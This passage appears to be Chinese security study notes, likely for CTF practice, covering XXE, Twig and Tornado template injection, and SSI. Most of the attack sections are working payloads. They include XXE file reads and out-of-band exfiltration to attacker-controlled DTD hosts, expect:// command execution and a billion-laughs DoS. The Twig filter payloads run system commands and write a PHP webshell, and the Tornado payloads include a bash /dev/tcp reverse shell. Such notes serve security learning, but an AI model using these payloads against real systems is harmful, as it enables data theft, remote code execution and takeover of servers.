# 把 test.xml 加载到这个文档对象中
$xmlDoc->load("test.xml");
# saveXML() 函数把内部 XML 文档放入一个字符串，然后直接将XML内容当作字符串输出
echo $xmlDoc->saveXML();

# 输出
<?xml version="1.0" encoding="ISO-8859-1"?>
<note>
    <to>Tove</to>
    <from>Jani</from>
    <heading>Reminder</heading>
    <body>Don't forget me this weekend!</body>
</note>
```

#### 1.4 遍历XML

当 XML 生成时，它通常会在节点之间包含空白。XML DOM 解析器把它们当作普通的元素，如果您不注意它们，有时会产生问题。

```php
<?php
$xmlDoc = new DOMDocument();
$xmlDoc->load("test.xml");

$x = $xmlDoc->documentElement;
foreach ($x->childNodes AS $item){
    echo $item->nodeName."=".$item->nodeValue."<br/>";
}

# 输出
#text=
    <br/>to=Tove<br/>#text=
    <br/>from=Jani<br/>#text=
    <br/>heading=Reminder<br/>#text=
    <br/>body=Don't forget me this weekend!<br/>#text=
<br/>
```

### 2. PHP Simple XML

SimpleXML 可把 XML 文档（或 XML 字符串）转换为对象，比如：

- 元素被转换为 `SimpleXMLElement` 对象的单一属性。当同一级别上存在多个元素时，它们会被置于**数组**中。
- 属性通过使用**关联数组**进行访问，其中的**索引对应属性名称**。
- 元素内部的文本被转换为字符串。如果一个元素拥有多个文本节点，则按照它们被找到的顺序进行排列。

```php
<?php
$xml = simplexml_load_file("test.xml");
print_r($xml);

# 输出
SimpleXMLElement Object
(
    [to] => Tove
    [from] => Jani
    [heading] => Reminder
    [body] => Don't forget me this weekend!
)
```

## 2. XML基础知识

### 2.1 XML

`XML`即 可扩展标记语言（EXtensible Markup Language），是一种标记语言，其标签没有预定义，您需要自行定义标签，是W3C的推荐标准。其于HTML的区别是：

- HTML 被设计用来**显示数据**
- XML 被设计用来**传输和存储数据**

XML文档结构包括：

- XML声明
- DTD文档类型定义（可选）
- 文档元素

```xml
<!--XML声明-->
<?xml version="1.0" encoding="UTF-8"?>

<!--DTD，这部分可选的-->          
<!DOCTYPE foo [ 
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >
]>

<!--文档元素-->                                                                          
<foo>&xxe;</foo>

```

### 2.2 DTD概念及声明/引用方式

DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。

DTD一般认为有两种引用或声明方式：

- 1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。
- 2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。

DTD实体有以下几种声明方式

**内部实体**

```xml
<!DOCTYPE note [
    <!ENTITY a "admin">
]>
<note>&a</note>
<!-- admin -->
```

PHP 代码解析	

```php
<?php
# 将XML文档转换为对象
$xml = simplexml_load_file("test.xml", null, LIBXML_NOENT);
# 强转 SimpleXMLElement，该类自带：__toString() 方法，可返回元素的文本内容
var_dump((string)$xml);
```

**参数实体**

```xml
<!DOCTYPE note[
        <!ENTITY % b "<!ENTITY b1 'aws1'>">
        %b;
        ]>
<note>&b1;</note>
<!-- aws1 -->
```

PHP 代码解析

```php
<?php
$xml = simplexml_load_file("test.xml", null, LIBXML_NOENT);
var_dump($xml);
var_dump((string)$xml)
```

- 参数实体用`% name`申明，引用时用`%name;`，只能在`DTD`中申明，`DTD`中引用。
- 其余实体直接用`name`申明，引用时用`&name;`，只能在`DTD`中申明，可在`xml`文档中引用

**外部实体**

```xml
<!DOCTYPE note [
    <!ENTITY c SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php">
]>
<note>&c</note>
<!-- PD9waHANCiRmbGFnID0gImZsYWcgaXMgdGhpcyI7DQplY2hvICRmbGFnOw0K -->
```

PHP 代码解析

```php
<?php
$xml = simplexml_load_file("test.xml", null, LIBXML_NOENT);
var_dump($xml);
var_dump((string)$xml);
```

外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示：

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/1270588-20200115235522292-2141935835.png)

上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/1270588-20200115235555856-2031563427.png)

**外部参数实体**

```xml
<!DOCTYPE note [
    <!ENTITY % d SYSTEM "http://127.0.0.1/test.dtd">
    %d;
]>
<note>&d1</note>
<!-- sugar -->
```

http://127.0.0.1/test.dtd

```xml
<!ENTITY d1 SYSTEM "data://text/plain;base64,c3VnYXI=">
```

PHP 代码解析

```php
<?php
$xml = simplexml_load_file("test.xml", null, LIBXML_NOENT);
var_dump($xml);
var_dump((string)$xml);
```

## 3. XML 外部实体注入

#### 3.1 任意文件读取

最简单也是最常用的利用方式
一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为Blind XXE，可以使用外带数据通道提取数据。

##### 有回显

**恶意引入外部实体**

直接读靶机文件，这里支持常用的PHP伪协议

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [
        <!ENTITY rabbit SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php" >
        ]>
<user><username>&rabbit;</username><password>123</password></user>
```

PHP 代码解析

```php
<?php
$xml = simplexml_load_file("test.xml", null, LIBXML_NOENT);
var_dump((string)$xml->username);
var_dump((string)$xml->password);
```

**恶意引入外部参数实体**

```xml
<?xml version="1.0" ?>
<!DOCTYPE test [
        <!ENTITY % file SYSTEM "http://127.0.0.1/hack.dtd">
        %file;
        ]>
<test>&hhh;</test>
```

hack.dtd

```xml
<!ENTITY hhh SYSTEM 'php://filter/read=convert.base64-encode/resource=D:/flag.txt'>
```

PHP代码解析

```php
<?php
$xml = simplexml_load_file("test.xml", null, LIBXML_NOENT);
var_dump((string)$xml);
```

##### 无回显

先使用`php://filter`获取目标文件的内容，然后将内容以`http`请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx。

```xml
<!DOCTYPE updateProfile [
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=./target.php">
    <!ENTITY % dtd SYSTEM "http://xxx.xxx.xxx/evil.dtd">
    %dtd;
    %send;
]>
```

evil.dtd的内容，内部的%号要进行实体编码成&#x25。

```xml
<!ENTITY % all
    "<!ENTITY &#x25; send SYSTEM 'http://xxx.xxx.xxx/?data=%file;'>"
>
%all;
```

访问接受数据的服务器中的**日志信息**，可以看到经过base64编码过的数据，解码后便可以得到数据。

流程：

1. file 实体获取敏感文件数据：`target.php`
2. dtd 实体获取服务器的dtd文件并执行
3. sned 实体带着数据访问服务器	

##### 基于报错

> 基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。
> 所以和OOB的构造方式几乎只有url出不同，其他地方一模一样。

**通过引入服务器文件**

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
	<!ENTITY % remote SYSTEM "http://blog.szfszf.top/xml.dtd">
	<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
	%remote;
	%send;
]>
<message>1234</message>
```

xml.dtd

```xml
<!-- xml.dtd -->
<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'file:///hhhhhhh/%file;'>">		<!-- 不同点在这里，构造了一个无法访问的URL然错误信息回弹 -->
%start;
```

##### 通过引入本地文件

如果目标主机的防火墙十分严格，不允许我们请求外网服务器dtd呢？由于XML的广泛使用，其实在各个系统中已经存在了部分DTD文件。按照上面的理论，我们只要是从外部引入DTD文件（引入系统自带的DTD文件），并在其中定义一些实体内容就行。

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
	<!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">
	<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
	<!ENTITY % ISOamso '
		<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;file://hhhhhhhh/?&#x25;file;&#x27;>">
		&#x25;eval;
		&#x25;send;
	'> 
	%remote;
]>
<message>1234</message>

```

我们仔细看一下很好理解，第一个调用的参数实体是%remote，在/usr/share/yelp/dtd/docbookx.dtd文件中调用了%ISOamso;，在ISOamso定义的实体中相继调用了eval、和send

##### 嵌套参数实体

> 我发现，虽然W3C协议是不允许在内部的实体声明中引用参数实体，但是很多XML解析器并没有很好的执行这个检查。几乎所有XML解析器能够发现如下这种两层嵌套式的

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
	<!ENTITY % file SYSTEM "file:///etc/passwd">  
	<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://myip/?%file;'>">
	%start;
	%send;
]>
<message>10</message>
```

基于报错的三层嵌套参数实体XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
	<!ELEMENT message ANY>
	<!ENTITY % para1 SYSTEM "file:///flag">
	<!ENTITY % para '
		<!ENTITY &#x25; para2 "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///&#x25;para1;&#x27;>">
		&#x25;para2;
	'>
	%para;
]>
<message>10</message>
```

#### 3.2 内网探测

和读文件差不多，只不过把URI改成内网机器地址；只能探测内网web服务器

```xml
<?xml version="1.0" encoding="UTF-8"?>        
<!DOCTYPE foo [ 
<!ELEMENT foo ANY >
<!ENTITY rabbit SYSTEM "http://127.0.0.1/1.txt" >
]>
<user><firstname>&rabbit;</firstname><lastname>666</lastname></user>
```

#### 3.3 RCE

这种情况很少发生，但有些情况下攻击者能够通过XXE执行代码，这主要是由于配置不当/开发内部应用导致的。如果我们足够幸运，并且PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，那么我们就可以执行如下的命令：

```xml
<?xml version="1.0"?>
<!DOCTYPE GVI [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<catalog>
   <core id="test101">
      <author>John, Doe</author>
      <title>I love XML</title>
      <category>Computers</category>
      <price>9.99</price>
      <date>2018-10-01</date>
      <description>&xxe;</description>
   </core>
</catalog>
```

响应：

```
{"error": "no results for description uid=0(root) gid=0(root) groups=0(root)...
```

#### 3.4 DOS

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。亦或者，如果目标是UNIX系统，XML 解析器尝试使用`/dev/random`文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ 
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///dev/random" >]>
<foo>&xxe;</foo>
```

## 4. XXE黑盒注入

### 4.1 XML数据传输特征

![屏幕截图 2023-11-23 085738](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-23%20085738.jpg)

### 4.2 XXE注入读取文件

```xml-dtd
payload：
<!DOCTYPE ANY [<!ENTITY test SYSTEM "file:///flag">]>
<user><username>&test;</username><password>note</password></user>
```

![image-20231123092247282](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231123092247282.png)

### 4.3 无回显带外测试

#### 4.3.1 申请域名

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231123092647688.png" alt="image-20231123092647688" style="zoom:50%;" />

#### 4.3.2 带外注入尝试

```xml-dtd
payload：
<?xml version="1.0" ?>
<!DOCTYPE test [
        <!ENTITY % file SYSTEM "http://afqxpc.dnslog.cn">
        %file;
        ]>
<user><username>&file;</username><password>note</password></user>
```

#### 3.3.3 刷新查看结果

由此可看出靶机确实访问了该站点。证明了的确存在XXE注入lou'd

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231123092759541.png" alt="image-20231123092759541" style="zoom:67%;" />

# Twig 模板注入

## 1. Twig 安装

建议通过 Composer 安装 Twig：我的Windows在直接在项目文件夹下执行这条命令即可

```
composer require "twig/twig:^3.0"
```

## 2. 注入原理

和其他的模板注入一样，Twig 模板注入也是发生在直接将用户输入作为模板，比如下面的代码：

这里的代码中，`createTemplate` 时注入了 `$_GET['name']`，此时就会引发模板注入。

```php
<?php
require_once __DIR__.'/vendor/autoload.php';
$loader = new \Twig\Loader\ArrayLoader();
$twig = new \Twig\Environment($loader);

$template = $twig->createTemplate("Hello {$_GET['name']}");
echo $template->render();
```

![image-20231125121342568](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231125121342568.png)

而如下代码则不会，因为模板引擎解析的是字符串常量中的 `{{name}}`，而不是动态拼接的 `$_GET["name"]`：这里的`{{name}}`由开发者静态指定

```php
<?php
require_once __DIR__.'/vendor/autoload.php';

$loader = new \Twig\Loader\ArrayLoader([
    'index' => 'Hello {{ name }}!',
]);
$twig = new \Twig\Environment($loader);

echo $twig->render('index', ['name' => 'whoami']);
```

## 3. Twig 1.x 注入

测试代码如下：

- index.php

```
<?php

include __DIR__.'/vendor/twig/twig/lib/Twig/Autoloader.php';
Twig_Autoloader::register();

$loader = new Twig_Loader_String();
$twig = new Twig_Environment($loader);
echo $twig->render($_GET['name']);
?>
```

在 Twig 1.x 中存在三个全局变量：

- `_self`：引用当前模板的实例。
- `_context`：引用当前上下文。
- `_charset`：引用当前字符集。

对应的代码是：

```
protected $specialVars = [
        '_self' => '$this',
        '_context' => '$context',
        '_charset' => '$this->env->getCharset()',
    ];
```

这里主要就是利用 `_self` 变量，它会返回当前 `\Twig\Template` 实例，并提供了指向 `Twig_Environment` 的 `env` 属性，这样我们就可以继续调用 `Twig_Environment` 中的其他方法，从而进行 SSTI。

比如以下 Payload 可以调用 `setCache` 方法改变 Twig 加载 PHP 文件的路径，在 `allow_url_include` 开启的情况下我们可以通过改变路径实现远程文件包含：

```
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
```

此外还有 `getFilter` 方法：

```
public function getFilter($name)
  {
    ...
    foreach ($this->filterCallbacks as $callback) {
    if (false !== $filter = call_user_func($callback, $name)) {
      return $filter;
    }
  }
  return false;
}

public function registerUndefinedFilterCallback($callable)
{
  $this->filterCallbacks[] = $callable;
}
```

我们在 `getFilter` 里发现了危险函数 `call_user_func`。通过传递参数到该函数中，我们可以调用任意 PHP 函数。Payload 如下：

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
// Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 4. Twig 2.注入

- index.php

```
<?php
require_once __DIR__.'/vendor/autoload.php';

$loader = new \Twig\Loader\ArrayLoader();
$twig = new \Twig\Environment($loader);

$template = $twig->createTemplate("Hello {$_GET['name']}!");

echo $template->render();
```

到了 Twig 2.x / 3.x 版本中，`__self` 变量在 SSTI 中早已失去了他的作用，但我们可以借助新版本中的一些过滤器实现攻击目的。

### 4.1 使用 map 过滤器

在 Twig 3.x 中，`map` 这个过滤器可以允许用户传递一个箭头函数，并将这个箭头函数应用于序列或映射的元素：

```
{% set people = [
    {first: "Bob", last: "Smith"},
    {first: "Alice", last: "Dupond"},
] %}

{{ people|map(p => "#{p.first} #{p.last}")|join(', ') }}
// Output: outputs Bob Smith, Alice Dupond


{% set people = {
    "Bob": "Smith",
    "Alice": "Dupond",
} %}

{{ people|map((last, first) => "#{first} #{last}")|join(', ') }}
// Output: outputs Bob Smith, Alice Dupond
```

当我们如下使用 `map` 时：

```
{{["Mark"]|map((arg)=>"Hello #{arg}!")}}
```

Twig 3.x 会将其编译成：

```
twig_array_map([0 => "Mark"], function ($__arg__) use ($context, $macros) { $context["arg"] = $__arg__; return ("hello " . ($context["arg"] ?? null))})
```

这个 `twig_array_map` 函数的源码如下：

```
function twig_array_map($array, $arrow)
{
    $r = [];
    foreach ($array as $k => $v) {
        $r[$k] = $arrow($v, $k);    // 直接将 $arrow 当做函数执行
    }

    return $r;
}
```

从上面的代码我们可以看到，传入的 `$arrow` 直接就被当成函数执行，即 `$arrow($v, $k)`，而 `$v` 和 `$k` 分别是 `$array` 中的 value 和 key。`$array` 和 `$arrow` 都是我们我们可控的，那我们可以不传箭头函数，直接传一个可传入两个参数的、能够命令执行的危险函数名即可实现命令执行。通过查阅常见的命令执行函数：

```
system ( string $command [, int &$return_var ] ) : string
passthru ( string $command [, int &$return_var ] )
exec ( string $command [, array &$output [, int &$return_var ]] ) : string
shell_exec ( string $cmd ) : string
```

前三个都可以使用。相应的 Payload 如下：

```
{{["id"]|map("system")}}
{{["id"]|map("passthru")}}
{{["id"]|map("exec")}}    // 无回显
```

其中，`{{["id"]|map("system")}}` 会被成下面这样：

```
twig_array_map([0 => "id"], "sysetm")
```

如果上面这些命令执行函数都被禁用了，我们还可以执行其他函数执行任意代码：

```
{{["phpinfo();"]|map("assert")|join(",")}}
{{{"<?php phpinfo();eval($_POST[whoami])":"/var/www/html/shell.php"}|map("file_put_contents")}}    // 写 Webshell
```

按照 `map` 的利用思路，我们去找带有 `$arrow` 参数的，可以发现下面几个过滤器也是可以利用的。

### 4.2 使用 sort 过滤器

这个 `sort` 筛选器可以用来对数组排序。

```
{% for user in users|sort %}
    ...
{% endfor %}
```

你可以传递一个箭头函数来对数组进行排序：

```
{% set fruits = [
    { name: 'Apples', quantity: 5 },
    { name: 'Oranges', quantity: 2 },
    { name: 'Grapes', quantity: 4 },
] %}

{% for fruit in fruits|sort((a, b) => a.quantity <=> b.quantity)|column('name') %}
    {{ fruit }}
{% endfor %}

// Output in this order: Oranges, Grapes, Apples
```

类似于 `map`，模板编译的过程中会进入 `twig_sort_filter` 函数，这个 `twig_sort_filter` 函数的源码如下：

```
function twig_sort_filter($array, $arrow = null)
{
    if ($array instanceof \Traversable) {
        $array = iterator_to_array($array);
    } elseif (!\is_array($array)) {
        throw new RuntimeError(sprintf('The sort filter only works with arrays or "Traversable", got "%s".', \gettype($array)));
    }

    if (null !== $arrow) {
        uasort($array, $arrow);    // 直接被 uasort 调用 
    } else {
        asort($array);
    }

    return $array;
}
```

从源码中可以看到，`$array` 和 `$arrow` 直接被 `uasort` 函数调用。众所周知 `uasort` 函数可以使用用户自定义的比较函数对数组中的元素按键值进行排序，如果我们自定义一个危险函数，将造成代码执行或命令执行：

```
php > $arr = ["id",0];
php > usort($arr,"system");
uid=0(root) gid=0(root) groups=0(root)
php >
```

知道了做这些我们便可以构造 Payload 了：

```
{{["id", 0]|sort("system")}}
{{["id", 0]|sort("passthru")}}
{{["id", 0]|sort("exec")}}    // 无回显
```

### 4.3 使用 filter 过滤器

这个 `filter` 过滤器使用箭头函数来过滤序列或映射中的元素。箭头函数用于接收序列或映射的值：

```
{% set lists = [34, 36, 38, 40, 42] %}
{{ lists|filter(v => v > 38)|join(', ') }}

// Output: 40, 42
```

类似于 `map`，模板编译的过程中会进入 `twig_array_filter` 函数，这个 `twig_array_filter` 函数的源码如下：

```
function twig_array_filter($array, $arrow)
{
    if (\is_array($array)) {
        return array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH);    // $array 和 $arrow 直接被 array_filter 函数调用
    }

    // the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator
    return new \CallbackFilterIterator(new \IteratorIterator($array), $arrow);
}
```

从源码中可以看到，`$array` 和 `$arrow` 直接被 `array_filter` 函数调用。 `array_filter` 函数可以用回调函数过滤数组中的元素，如果我们自定义一个危险函数，将造成代码执行或命令执行：

```
php > $arr = ["id"];
php > array_filter($arr,"system");
uid=0(root) gid=0(root) groups=0(root)
php >
```

下面给出几个 Payload：

```
{{["id"]|filter("system")}}
{{["id"]|filter("passthru")}}
{{["id"]|filter("exec")}}    // 无回显
```

### 4.4 使用reduce过滤器

这个 `reduce` 过滤器使用箭头函数迭代地将序列或映射中的多个元素缩减为单个值。箭头函数接收上一次迭代的返回值和序列或映射的当前值：

```
{% set numbers = [1, 2, 3] %}
{{ numbers|reduce((carry, v) => carry + v) }}
// Output: 6
```

类似于 `map`，模板编译的过程中会进入 `twig_array_reduce` 函数，这个 `twig_array_reduce` 函数的源码如下：

```
function twig_array_reduce($array, $arrow, $initial = null)
{
    if (!\is_array($array)) {
        $array = iterator_to_array($array);
    }

    return array_reduce($array, $arrow, $initial);    // $array, $arrow 和 $initial 直接被 array_reduce 函数调用
}
```

从源码中可以看到，`$array` 和 `$arrow` 直接被 `array_filter` 函数调用。 `array_reduce` 函数可以发送数组中的值到用户自定义函数，并返回一个字符串。如果我们自定义一个危险函数，将造成代码执行或命令执行。

直接给出 Payload：

```
{{[0, 0]|reduce("system", "id")}}
{{[0, 0]|reduce("passthru", "id")}}
{{[0, 0]|reduce("exec", "id")}}    // 无回显
```

# tornado 模板注入

> 参考：https://xz.aliyun.com/t/12260#toc-8

## 1. 常规手法:

Tornado中SSTI 手法基本上兼容 jinja2、mako 的 SSTI 手法，思路非常灵活：

```
{{ __import__("os").system("whoami") }}
{% apply __import__("os").system %}id{% end %}
{% raw __import__("os").system("whoami") %}
```

## 2. 利用 HTTPServerRequest：

为了方便下面把 `tornado.httputil.HTTPServerRequest` 的实例称为 `request`。

注意，由于属性非常多，属性自己也还有属性。所以这部分我只列了一些我感觉会用到的属性，肯定不全，有特殊需求的话需要自行进行挖掘。

**绕过字符限制**：

- `request.query`：包含 get 参数
- `request.query_arguments`：解析成字典的 get 参数，可用于传递基础类型的值（字符串、整数等）
- `request.arguments`：包含 get、post 参数
- `request.body`：包含 post 参数
- `request.body_arguments`：解析成字典的 post 参数，可用于传递基础类型的值（字符串、整数等）
- `request.cookies`：就是 cookie
- `request.files`：上传的文件
- `request.headers`：请求头
- `request.full_url`：完整的 url
- `request.uri`：包含 get 参数的 url。有趣的是，直接 `str(requests)` 然后切片，也可以获得包含 get 参数的 url。这样的话不需要 `.` 或者 `getattr` 之类的函数了。
- `request.host`：Host 头
- `request.host_name`：Host 头

```
{{request.method}}  //返回请求方法名  GET|POST|PUT...
{{request.query}}  //传入?a=123 则返回a=123
{{request.arguments}}   //返回所有参数组成的字典
{{request.cookies}}   //同{{handler.cookies}}
```

**回显结果**

- `request.connection.write`
- `request.connection.stream.write`
- `request.server_connection.stream.write`

例如：

```
{%raw request.connection.write(("HTTP/1.1 200 OK\r\nCMD: "+__import__("os").popen("id").read()).encode()+b"hacked: ")%}'
```

### 2.1 利用 Application:

主要用于攻击的有这几个属性：

```
- Application.settings：web 服务的配置，可能会泄露一些敏感的配置
- Application.add_handlers：新增一个服务处理逻辑，可用于制作内存马，后面会一起说
- Application.wildcard_router.add_rules：新增一个 url 处理逻辑，可用于制作内存马
- Application.add_transform：新增一个返回数据的处理逻辑，理论上可以配合响应头来搞个内存马
```

### 2.1 利用 RequestHandler:

为了方便下面把 `tornado.web.RequestHandler` 称为 `handler`。需要注意的是，handler 是有 `request` 属性的，所以理论上 handler 要比 request 实用。

```
{{handler.get_argument('yu')}}   //比如传入?yu=123则返回值为123
{{handler.cookies}}  //返回cookie值
{{handler.get_cookie("data")}}  //返回cookie中data的值
{{handler.decode_argument('\u0066')}}  //返回f，其中\u0066为f的unicode编码
{{handler.get_query_argument('yu')}}  //比如传入?yu=123则返回值为123
{{handler.settings}}  //比如传入application.settings中的值
```

**绕过字符限制**:

1. `RequestHandler.request.*`：参考利用 `HTTPServerRequest` 那节
2. 其他和 request 一样的方法：例如 `get_argument` 等等，就不一一列举了，可以参考官方文档

**回显结果**:

```
- RequestHandler.set_cookie：设置 cookie
- RequestHandler.set_header：设置一个新的响应头
- RequestHandler.redirect：重定向，可以通过 location 获取回显
- RequestHandler.send_error：发送错误码和错误信息
- RequestHandler.write_error：同上，被 `send_error` 调用
```

## 绕过：

### global()函数全局调用&绕过`_`:

我们可以发现在tornado中是可以直接使用global()函数的，更令我们兴奋的是竟然可以直接调用一些python的初始方法，比如**import**、eval、print、hex等，这下似乎我们的payload可以更加简洁了

```
{{__import__("os").popen("ls").read()}}
{{eval('__import__("os").popen("ls").read()')}}
```

其中第二种方法更多的是为了我们刚才讲到的目的，绕过对`_`的过滤。

```
{{eval(handler.get_argument('yu'))}}
?yu=__import__("os").popen("ls").read()
```

### 绕过`.`：

因为tornado中没有过滤器，这样的话我们想要绕过对于.的过滤就有些困难了。而如果想要绕过对于引号的过滤，可以将上面的payload改成如下格式

```
{{eval(handler.get_argument(request.method))}}
然后看下请求方法，如果是get的话就可以传?GET=__import__("os").popen("ls").read()，post同理
```

### 无过滤payload ：

```
1、读文件
{% extends "/etc/passwd" %}
{% include "/etc/passwd" %}

2、 直接使用函数
{{__import__("os").popen("ls").read()}}
{{eval('__import__("os").popen("ls").read()')}}

3、导入库
{% import os %}{{os.popen("ls").read()}}

4、flask中的payload大部分也通用
{{"".__class__.__mro__[-1].__subclasses__()[133].__init__.__globals__["popen"]('ls').read()}}
{{"".__class__.__mro__[-1].__subclasses__()[x].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}}

其中"".__class__.__mro__[-1].__subclasses__()[133]为<class 'os._wrap_close'>类
第二个中的x为有__builtins__的class

5、利用tornado特有的对象或者方法
{{handler.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}}
{{handler.request.server_connection._serving_future._coro.cr_frame.f_builtins['eval']("__import__('os').popen('ls').read()")}}

6、利用tornado模板中的代码注入
{% raw "__import__('os').popen('ls').read()"%0a    _tt_utf8 = eval%}{{'1'%0a    _tt_utf8 = str}}
```

过滤payload：

```
1.过滤一些关键字如import、os、popen等（过滤引号该方法同样适用）
{{eval(handler.get_argument(request.method))}}
然后看下请求方法，如果是get的话就可以传?GET=__import__("os").popen("ls").read()，post同理
2.过滤了括号未过滤引号
{% raw "\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x6c\x73\x27\x29\x2e\x72\x65\x61\x64\x28\x29"%0a    _tt_utf8 = eval%}{{'1'%0a    _tt_utf8 = str}}
3.过滤括号及引号
下面这种方法无回显，适用于反弹shell，为什么用exec不用eval呢？
是因为eval不支持多行语句。
__import__('os').system('bash -i >& /dev/tcp/xxx/xxx 0>&1')%0a"""%0a&data={%autoescape None%}{% raw request.body%0a    _tt_utf8=exec%}&%0a"""
4.其他
通过参考其他师傅的文章学到了下面的方法（两个是一起使用的）
{{handler.application.default_router.add_rules([["123","os.po"+"pen","a","345"]])}}
{{handler.application.default_router.named_rules['345'].target('/readflag').read()}}
```

# SSI 注入

> 参考：https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/

## 0x01 基本概念

### 何为SSI

SSI全称是Server Side Includes，即服务器端包含，是一种基于服务器端的网页制作技术。

SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。

基本原理就是：**SSI在HTML文件中，可以通过注释行调用命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。**

### SHTML文件

SHTML即Server-Parsed HTML。

shtml文件（还有stm、shtm文件）就是应用了SSI技术的html文件，所以在.shtml页面返回到客户端前，页面中的SSI指令将被服务器解析。可以使用SSI指令将其它文件、图片包含在页面中，也可以将其它的CGI程序包含在页面中，如.aspx文件。在给客户端返回的页面中不会包含SSI指令。如果SSI指令不能被解析，则浏览器会将其做为普通的HTML注释处理。

### Web服务启动SSI

#### Nginx

在Nginx中，开启SSI只需在配置文件中添加如下几项：

```
ssi on;
ssi_silent_errors off;
ssi_types text/shtml;
```

如：

```
server{
	listen 80;
	server_name www.hello.com
	# 配置SSL
	ssi on; # 开启SSI支持
	ssi_silent_errors on; # 默认为off，设置为on则在处理SSI文件出错时不输出错误信息
	ssi_types text/html; # 需要支持的shtml 默认是 text/html
	
	location / {
		root html;
		index index.html index.htm;
	}
}
```

#### Apache

修改Apache配置文件httpd.conf：

1、确认加载include.so模块，将注释去掉：

```
LoadModule include_module libexec/apache2/mod_include.so
```

2、AddType部分去掉这两段注释：

```
AddType text/html .shtml
AddOutputFilter INCLUDES .shtml
```

3、Directory目录权限里面找到`Options Indexes FollowSymLinks`，并增加Includes修改为`Options Indexes FollowSymLinks Includes`；

4、重新启动Apache；

#### IIS

不同版本的Windows下配置有所区别，具体的参考下资料就好：

[win7下使用IIS服务器及自定义服务器端包含模块（SSI）步骤](https://www.cnblogs.com/liuzhibin/p/5386454.html)

